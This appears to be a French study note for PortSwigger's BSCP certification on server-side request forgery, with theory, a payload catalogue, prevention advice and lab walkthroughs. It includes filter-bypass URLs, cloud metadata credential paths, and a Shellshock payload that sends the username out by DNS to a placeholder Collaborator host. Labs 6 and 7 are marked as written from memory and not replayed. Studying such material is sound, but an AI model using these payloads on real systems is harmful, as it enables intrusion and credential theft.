---
tags: [bscp, server-side, ssrf]
niveau: practitioner
statut: en cours
---
# Server-side request forgery (SSRF)

## En bref
- La SSRF est une faille qui permet à un attaquant d'amener une application côté serveur à envoyer des requêtes vers une destination non prévue.
- Le serveur peut être amené à se connecter à des services à usage interne, au sein de l'infrastructure, ou à des systèmes externes.
- Fonctionnement : le client envoie une valeur (URL, nom d'hôte, chemin) à l'application. C'est ensuite l'application, et non le navigateur du client, qui envoie la requête à la destination. La destination voit l'adresse du serveur et lui accorde la confiance qui va avec.
![](SSRF.png)

## Impact
- Une attaque SSRF réussie peut entraîner des actions non autorisées ou un accès non autorisé aux données sensibles au sein d'une organisation.
- Cela peut se produire dans l'application elle-même, ou sur d'autres systèmes back-end avec lesquels elle communique.
- Dans certains cas, la SSRF peut permettre à un attaquant d'exécuter des commandes arbitraires.
- Ces attaques peuvent sembler provenir de l'organisation qui héberge l'application vulnérable (l'adresse IP source est celle du serveur).

## Types et variantes
- Les attaques SSRF exploitent souvent des relations de confiance pour étendre l'attaque à partir de l'application vulnérable : la confiance envers le serveur lui-même, ou envers d'autres systèmes back-end de la même organisation. Exemples concrets : une interface d'administration accessible sans authentification depuis le bouclage, un access control placé en amont et contourné par une requête interne, un port d'administration distinct (voir [[SSRF-serveur-local]]). L'access control lui-même est traité dans [[Access-control]].
- Il est fréquent de rencontrer des applications vulnérables qui intègrent des mesures de protection contre l'exploitation. Ces mesures peuvent souvent être contournées.

### Schéma, hôte, port, chemin
Une URL se décompose en quatre parties que le filtre peut contrôler, ou oublier de contrôler, séparément : le schéma (`http`, `https`, autres), l'hôte (nom ou adresse), le port et le chemin. Toute la logique de bypass en dépend : une blocklist sur l'hôte se contourne par une autre représentation de l'adresse, un filtre sur le chemin par l'encodage, un filtre sur le port par un port non listé. Il faut donc tester les quatre parties l'une après l'autre, pas en bloc.

### Réponse visible, blind, semi-blind
- SSRF complète : la réponse de la destination est renvoyée au client.
- Blind SSRF : aucune réponse n'est visible, seule une interaction externe (Collaborator) prouve la requête.
- Semi-blind SSRF : pas de contenu, mais des indices indirects (code de statut, durée, taille de la réponse, message d'erreur) permettent de distinguer hôte joignable, filtré ou inexistant.

| Type | Idée clé | Signal d'observation | Note | Niveau |
| --- | --- | --- | --- | --- |
| Contre le serveur local | Valeur pointant vers le bouclage | Contenu de l'interface interne | [[SSRF-serveur-local]] | Apprentice |
| Contre d'autres systèmes back-end | Adresses privées, balayage Intruder | Un statut ou une taille qui se distingue | [[SSRF-systemes-back-end]] | Apprentice |
| Filtre par blocklist | Autre représentation de l'adresse, encodage du chemin | Passage de bloqué à accepté | [[SSRF-filtre-liste-noire]] | Practitioner |
| Filtre par allowlist | Confusion d'analyse de l'URL, encodage | Passage de refusé à accepté | [[SSRF-filtre-liste-blanche]] | Expert |
| Open redirect | Domaine autorisé qui redirige | Contenu de la destination finale | [[SSRF-redirection-ouverte]] | Practitioner |
| Blind SSRF | Détection out-of-band (OAST) | Interaction DNS ou HTTP dans Collaborator | [[SSRF-aveugle]] | Practitioner (lab 5), Expert (lab 7) |
| Surfaces cachées | URL partielles, XML, `Referer` | Variable selon la surface | [[SSRF-surfaces-cachees]] | Practitioner |

Dans la ligne Blind SSRF, le lab 5 relève de Practitioner (détection simple) et le lab 7 d'Expert (exploitation d'un service interne vulnérable, via la blind SSRF).

## Comment détecter
- Repérer tout paramètre, corps ou header qui contient une URL, un nom d'hôte ou un chemin : `url`, `stockApi`, `path`, `redirect`, `webhook`, `callback`, champs JSON et XML, headers `Referer`, `Host`, `X-Forwarded-Host`, import par URL, génération de PDF, aperçu de lien, avatar distant (voir [[SSRF-surfaces-cachees]]).
- Comparer à trois points pour chaque emplacement : la valeur d'origine, un hôte local (`http://localhost/`), un hôte inexistant. La différence entre les trois distingue filtré, non joignable et joignable.
- Signaux à noter à chaque essai : code de statut, longueur, durée de réponse, texte d'erreur, interaction DNS seule ou DNS plus HTTP dans Collaborator.
- Si la réponse n'affiche rien mais que Collaborator reçoit une interaction : blind SSRF (voir [[SSRF-aveugle]]).
- Si seule une requête DNS arrive, deux explications sont possibles et aucune n'est certaine : la requête HTTP sortante est filtrée, ou le serveur a seulement résolu le nom pour le valider sans envoyer de requête ensuite.

## Comment exploiter (principe)
1. Identifier le paramètre qui déclenche la requête côté serveur.
2. Déterminer si la réponse est visible (SSRF complète), absente (blind SSRF) ou indirecte (semi-blind SSRF).
3. Viser en priorité le serveur lui-même (`localhost`) puis les plages privées (`192.168.0.0/16`, `10.0.0.0/8`, `172.16.0.0/12`), en variant aussi les ports.
4. Si un filtre bloque la requête, identifier sa nature (blocklist ou allowlist), puis la partie de l'URL concernée (schéma, hôte, port, chemin), et appliquer la technique de bypass correspondante.
5. Lire le HTML de l'interface trouvée pour repérer l'action à déclencher, puis la rejouer via la SSRF.

Limites à garder en tête, selon la cible :
- Le client HTTP du serveur accepte souvent seulement `http` et `https`.
- La méthode et les headers ne sont généralement pas contrôlables : la requête est souvent un GET. Dans les labs, la suppression passe par un GET, ce qui n'est pas le cas général.
- Une réponse non textuelle ou volumineuse peut être tronquée ou rejetée.
- Une validation faite sur une première résolution DNS peut être suivie d'une seconde résolution à l'envoi (rebinding).

Détails dans [[SSRF-serveur-local]] et [[SSRF-systemes-back-end]].

## Catalogue de payloads par variante
Les majuscules et les crochets sont des espaces réservés. À utiliser uniquement sur des labs ou des cibles autorisées.

### Serveur local
| Payload | Contexte | Signal attendu | Limites |
| --- | --- | --- | --- |
| `stockApi=http://localhost/admin` | Paramètre contenant une URL complète | Interface d'administration dans la réponse | Bloqué si filtre sur `localhost` |
| URL de suppression lue dans le HTML | Action à déclencher | Action effectuée | GET seulement, chemin tiré du HTML |
| `http://localhost:PORT/admin` avec PORT parmi 80, 8080, 8000, 8443 | Interface sur un autre port | Réponse différente selon le port | Balayage lent |
| `http://localhost/console`, `/actuator` | Chemins sensibles | Réponse différente de 404 | Dépend de la technologie |

### Systèmes back-end internes
| Payload | Contexte | Signal attendu | Limites |
| --- | --- | --- | --- |
| `http://192.168.0.§1§:8080/admin`, Numbers de 1 à 255 | Balayage Intruder | Un seul statut différent | Plage et port supposés connus |
| `http://10.0.0.§1§/` et `http://172.16.0.§1§/` | Autres plages privées | Statut ou durée différents | Espace à balayer très large |
| `http://192.168.0.1:§80§/` avec liste de ports | Port inconnu | Statut ou durée différents | Bruit élevé |
| Mesure du temps de réponse | Aucune réponse visible | Rapide : hôte atteint ; lent : filtré | Interprétation incertaine |

### Blind SSRF out-of-band (OAST)
| Payload | Contexte | Signal attendu | Limites |
| --- | --- | --- | --- |
| `Referer: http://BURP-COLLABORATOR-SUBDOMAIN` | Logiciel d'analyse qui récupère le `Referer` | Interactions DNS puis HTTP après "Poll now" | Traitement asynchrone, patienter |
| `stockApi=http://BURP-COLLABORATOR-SUBDOMAIN/` | Paramètre URL sans réponse visible | Interaction DNS et HTTP | Dans les labs, serveur public par défaut seulement |
| `Host: ...` ou `X-Forwarded-Host: BURP-COLLABORATOR-SUBDOMAIN` | Headers que le serveur peut résoudre | Interaction DNS | Dépend de l'infrastructure ([[HTTP-Host-header]]) |
| URL Collaborator dans un champ XML, un webhook, un PDF | Surfaces cachées | Interaction DNS ou HTTP | Dépend de la fonctionnalité ([[XXE-injection]] pour le XML) |

### Bypass de blocklist
| Payload | Signal attendu | Limites |
| --- | --- | --- |
| `http://127.0.0.1/` | Bloqué (confirme le filtre) | Aucune |
| `http://127.1/` | Passe le filtre | Le client doit accepter la forme abrégée |
| `http://127.1/%2561dmin` | Le chemin passe (double encodage) | Suppose un décodage en deux temps |
| `http://2130706433/` (décimal) | Passe le filtre | Dépend de l'analyseur |
| `http://017700000001/` (octal), `http://0x7f000001/` (hexadécimal) | Idem | Selon l'analyseur |
| `http://[::1]/` (IPv6) | Idem | Le service doit écouter en IPv6 |
| `http://0/` ou `http://0.0.0.0/` | Idem | Comportement variable selon le système |
| `http://127.1/%61dmin` (encodage simple), `http://127.1/ADMIN` (casse) | Le chemin passe | Souvent décodé par le filtre, chemins sensibles à la casse |
| `http://spoofed.burpcollaborator.net/` | Nom censé résoudre vers `127.0.0.1` d'après la documentation PortSwigger | Domaine d'exemple ; interdit hors serveur par défaut dans les labs |

### Allowlist
Les formes génériques (`@`, `#`, sous-domaine, encodage) sont décrites dans [[SSRF-filtre-liste-blanche]] ; elles ne sont pas répétées ici.

### Open redirect
| Payload | Contexte | Signal attendu | Limites |
| --- | --- | --- | --- |
| `stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin` | Chemin relatif accepté, open redirect via `path` | Page d'administration interne renvoyée | Le client doit suivre la redirection |
| Même forme avec `/admin/delete?username=carlos` | Action de suppression | Action effectuée | Valeurs propres au lab |
| `.../redirect?url=http://BURP-COLLABORATOR-SUBDOMAIN` | Test préalable de la redirection | Interaction ou header `Location` | Serveur par défaut dans les labs |

### Métadonnées cloud (cible réelle seulement)
| Payload | Contexte | Signal attendu | Limites |
| --- | --- | --- | --- |
| `http://169.254.169.254/latest/meta-data/` | AWS, métadonnées version 1 | Liste de clés | La version 2 exige un token obtenu par PUT, souvent infaisable via GET |
| `.../iam/security-credentials/` sous le chemin précédent | Identifiants du rôle | Nom du rôle puis identifiants | Données très sensibles : preuve minimale seulement |
| `http://metadata.google.internal/computeMetadata/v1/` | Google Cloud | Réponse avec le header `Metadata-Flavor: Google` | Header non contrôlable via une SSRF simple |
| `http://169.254.169.254/metadata/instance?api-version=2021-02-01` | Azure | Réponse avec le header `Metadata: true` | Idem |
| Schémas `file://`, `gopher://`, `dict://` | Client acceptant d'autres schémas | Lecture de fichier ou octets bruts | Rarement acceptés |

## Pièges et points d'attention BSCP
Attendu dans les labs :
- Un filtre peut empiler plusieurs défenses : contourner l'hôte, puis le chemin, séparément.
- Si une URL externe est refusée mais que le domaine local passe, penser à l'open redirect.
- Les interactions avec des systèmes externes arbitraires sont bloquées par le pare-feu de l'Academy : utiliser le serveur public par défaut de Burp Collaborator.
- Ne pas se limiter à `stockApi` : le lab 5 montre qu'un header (`Referer`) peut être la porte d'entrée.
- Certains labs exigent Burp Suite Professional (Collaborator, Intruder rapide).
- Relire la réponse complète, pas seulement le statut.
- À l'examen, la SSRF sert souvent de maillon dans une chaîne (accès à un compte ou à des fichiers), pas de fin en soi.

Cible réelle (hors énoncé de la formation) :
- Points de métadonnées cloud et schémas autres que HTTP (voir le catalogue).
- Rebinding DNS : la validation et la requête peuvent résoudre le nom séparément.
- Pas de limite de pare-feu comme dans les labs : un domaine contrôlé peut servir, sur autorisation.

## Prévention
- Préférer une allowlist stricte de destinations (hôtes, ports, chemins) plutôt qu'une blocklist.
- Valider le schéma (HTTP et HTTPS uniquement) et résoudre le nom d'hôte côté serveur avant la requête, vérifier que l'adresse résolue n'est pas privée ni de bouclage, puis utiliser cette adresse épinglée pour la requête (contre le rebinding).
- Désactiver le suivi des redirections ou revalider chaque redirection.
- Ne pas renvoyer au client la réponse brute : cela réduit l'impact mais ne supprime pas la SSRF, la requête reste émise.
- Segmenter le réseau et authentifier les services internes, dont les métadonnées cloud (version 2 avec token) : ne pas se reposer sur la seule topologie ou sur la provenance locale d'une requête.
- Bloquer les connexions sortantes inutiles depuis le serveur d'applications.
- Journaliser les requêtes sortantes et alerter sur les destinations inhabituelles.

## Labs PortSwigger
- [x] Apprentice ✅ 2026-10-07
- [x] Practitioner ✅ 2026-10-07
- [ ] Expert

## Journal des labs

### Lab 1 - SSRF basique contre le serveur local
*Basic SSRF against the local server* - Apprentice - note : [[SSRF-serveur-local]]

Ce lab propose une fonction de vérification de stock qui récupère des données depuis un système interne.
Pour le résoudre, modifiez l'URL de vérification de stock afin d'accéder à l'interface d'administration à l'adresse `http://localhost/admin`, puis supprimez l'utilisateur `carlos`.

1. Accédez à `/admin` et constatez que vous ne pouvez pas accéder directement à la page d'administration.
2. Ouvrez une page produit, cliquez sur « Check stock », interceptez la requête dans Burp Suite et envoyez-la dans Burp Repeater.
3. Remplacez l'URL du paramètre `stockApi` par `http://localhost/admin`. L'interface d'administration doit s'afficher.
4. Lisez le HTML pour identifier l'URL de suppression de l'utilisateur cible :

   `http://localhost/admin/delete?username=carlos`
5. Soumettez cette URL dans le paramètre `stockApi` pour mener l'attaque SSRF.

### Lab 2 - SSRF basique contre un autre système back-end
*Basic SSRF against another back-end system* - Apprentice - note : [[SSRF-systemes-back-end]]

Ce lab propose une fonction de vérification de stock qui récupère des données depuis un système interne.
Pour le résoudre, utilisez la vérification de stock afin de balayer la plage interne `192.168.0.X` à la recherche d'une interface d'administration sur le port `8080`, puis utilisez-la pour supprimer l'utilisateur `carlos`.

1. Ouvrez une page produit, cliquez sur **Check stock**, interceptez la requête dans Burp Suite et envoyez-la dans Burp Intruder.
2. Remplacez le paramètre `stockApi` par `http://192.168.0.1:8080/admin`, puis sélectionnez le dernier octet de l'adresse IP (le nombre `1`) et cliquez sur **Add §**.
3. Dans le panneau **Payloads**, choisissez le type de payload **Numbers**, puis saisissez 1, 255 et 1 dans les champs **From**, **To** et **Step**.
4. Cliquez sur **Start attack**.
5. Cliquez sur la colonne **Status** pour trier par code de statut croissant. Une seule entrée doit avoir le statut `200` et afficher une interface d'administration.
6. Cliquez sur cette requête, envoyez-la dans Burp Repeater et remplacez le chemin dans `stockApi` par : `/admin/delete?username=carlos`

### Lab 3 - SSRF avec filtre d'entrée basé sur une liste noire
*SSRF with blacklist-based input filter* - Practitioner - note : [[SSRF-filtre-liste-noire]]

Ce lab propose une fonction de vérification de stock qui récupère des données depuis un système interne.
Pour le résoudre, modifiez l'URL de vérification de stock afin d'accéder à l'interface d'administration à l'adresse `http://localhost/admin`, puis supprimez l'utilisateur `carlos`.
Le développeur a mis en place deux défenses anti-SSRF faibles que vous devrez contourner.

1. Ouvrez une page produit, cliquez sur « Check stock », interceptez la requête dans Burp Suite et envoyez-la dans Burp Repeater.
2. Remplacez l'URL du paramètre `stockApi` par `http://127.0.0.1/` et constatez que la requête est bloquée.
3. Contournez le blocage avec l'URL `http://127.1/`.
4. Remplacez l'URL par `http://127.1/admin` et constatez que la requête est de nouveau bloquée.
5. Masquez le « a » en le double-encodant en `%2561` pour accéder à l'interface d'administration, puis supprimez l'utilisateur cible.

### Lab 4 - SSRF avec contournement du filtre via une redirection ouverte
*SSRF with filter bypass via open redirection vulnerability* - Practitioner - note : [[SSRF-redirection-ouverte]]

Ce lab propose une fonction de vérification de stock qui récupère des données depuis un système interne.
Pour le résoudre, modifiez l'URL de vérification de stock afin d'accéder à l'interface d'administration à l'adresse `http://192.168.0.12:8080/admin`, puis supprimez l'utilisateur `carlos`.
Le vérificateur de stock est restreint à l'application locale : vous devez donc d'abord trouver une redirection ouverte qui affecte l'application.

1. Ouvrez une page produit, cliquez sur « Check stock », interceptez la requête dans Burp Suite et envoyez-la dans Burp Repeater.
2. Essayez de modifier le paramètre `stockApi` et constatez qu'il est impossible de faire envoyer la requête directement vers un autre hôte.
3. Cliquez sur « next product » et constatez que le paramètre `path` est placé dans l'en-tête `Location` d'une réponse de redirection, ce qui constitue une redirection ouverte.
4. Construisez une URL qui exploite la redirection ouverte et redirige vers l'interface d'administration, puis placez-la dans le paramètre `stockApi` du vérificateur de stock :

   `/product/nextProduct?path=http://192.168.0.12:8080/admin`
5. Constatez que le vérificateur de stock suit la redirection et affiche la page d'administration.
6. Modifiez le paramètre `path` pour supprimer l'utilisateur cible :

   `/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos`

### Lab 5 - SSRF aveugle avec détection hors bande
*Blind SSRF with out-of-band detection* - Practitioner - notes : [[SSRF-aveugle]], [[SSRF-surfaces-cachees]]

Ce site utilise un logiciel d'analyse qui récupère l'URL indiquée dans l'en-tête `Referer` lors du chargement d'une page produit.
Pour résoudre le lab, utilisez cette fonctionnalité pour provoquer une requête HTTP vers le serveur public de Burp Collaborator.

> [!note] Remarque
> Pour éviter que la plateforme Academy soit utilisée pour attaquer des tiers, notre pare-feu bloque les interactions entre les labs et des systèmes externes arbitraires. Pour résoudre le lab, vous devez utiliser le serveur public par défaut de Burp Collaborator.

1. Ouvrez une page produit, interceptez la requête dans Burp Suite et envoyez-la dans Burp Repeater.
2. Allez dans l'onglet Repeater. Sélectionnez l'en-tête `Referer`, faites un clic droit et choisissez « Insert Collaborator Payload » pour remplacer le domaine d'origine par un domaine généré par Burp Collaborator. Envoyez la requête.
3. Allez dans l'onglet Collaborator et cliquez sur « Poll now ». Si aucune interaction n'apparaît, patientez quelques secondes et réessayez : la commande côté serveur est exécutée de façon asynchrone.
4. Vous devriez voir des interactions DNS et HTTP initiées par l'application à la suite de votre payload.

### Lab 6 - SSRF avec filtre d'entrée basé sur une liste blanche
*SSRF with whitelist-based input filter* - Expert - note : [[SSRF-filtre-liste-blanche]]

> [!warning] Étapes rédigées de mémoire
> Cette section n'était pas dans la page d'origine. Les étapes ci-dessous sont reconstituées de mémoire à partir de la solution publique du lab et n'ont pas été rejouées : à vérifier sur le lab.

Pour le résoudre, modifiez l'URL de vérification de stock afin d'accéder à l'interface d'administration à l'adresse `http://localhost/admin`, puis supprimez l'utilisateur `carlos`. Le développeur a mis en place une défense anti-SSRF qu'il faut contourner.

1. Ouvrez une page produit, cliquez sur « Check stock », interceptez la requête et envoyez-la dans Burp Repeater.
2. Remplacez `stockApi` par `http://localhost/` et constatez que la requête est refusée : l'hôte doit être `stock.weliketoshop.net`.
3. Testez `http://username@stock.weliketoshop.net/` : la requête est acceptée, ce qui montre que l'analyseur accepte les identifiants avant le nom d'hôte.
4. Ajoutez un fragment : `http://localhost#@stock.weliketoshop.net/` est refusé car `#` est bloqué.
5. Double-encodez `#` en `%2523` : `http://localhost%2523@stock.weliketoshop.net/` est accepté.
6. Ajoutez le chemin d'administration : `http://localhost:80%2523@stock.weliketoshop.net/admin`.
7. Lisez le HTML pour trouver l'URL de suppression, puis envoyez `http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos`.

### Lab 7 - SSRF aveugle avec exploitation de Shellshock
*Blind SSRF with Shellshock exploitation* - Expert - note : [[SSRF-aveugle]]

> [!warning] Étapes rédigées de mémoire
> Cette section n'était pas dans la page d'origine. Les étapes ci-dessous sont reconstituées de mémoire à partir de la solution publique du lab et n'ont pas été rejouées : à vérifier sur le lab. Le lab nécessite Burp Suite Professional (Collaborator).

Le site utilise un logiciel d'analyse qui récupère l'URL indiquée dans l'en-tête `Referer`. Un serveur interne de la plage `192.168.0.X` sur le port `8080` est vulnérable à Shellshock. Pour résoudre le lab, utilisez la SSRF pour exécuter une commande sur ce serveur et exfiltrer le nom de l'utilisateur du système d'exploitation via une requête DNS vers Burp Collaborator.

1. Ouvrez une page produit, interceptez la requête et envoyez-la dans Burp Intruder.
2. Dans l'en-tête `User-Agent`, placez la charge Shellshock, avec un sous-domaine Collaborator : `() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN`
3. Remplacez l'en-tête `Referer` par `http://192.168.0.1:8080` et placez une position de payload sur le dernier octet.
4. Choisissez le type de payload **Numbers**, de 1 à 255, par pas de 1, puis lancez l'attaque.
5. Dans l'onglet Collaborator, cliquez sur « Poll now » : une interaction DNS contient le nom de l'utilisateur en sous-domaine.
6. Soumettez ce nom d'utilisateur pour valider le lab.

## Liens
- [[Command-injection]] : command injection, liée au lab 7 (Shellshock).
- [[XXE-injection]] : SSRF déclenchée par une entité externe XML.
- [[HTTP-Host-header]] : header `Host` comme point d'entrée.
- [[Access-control]] : confiance accordée aux requêtes locales.
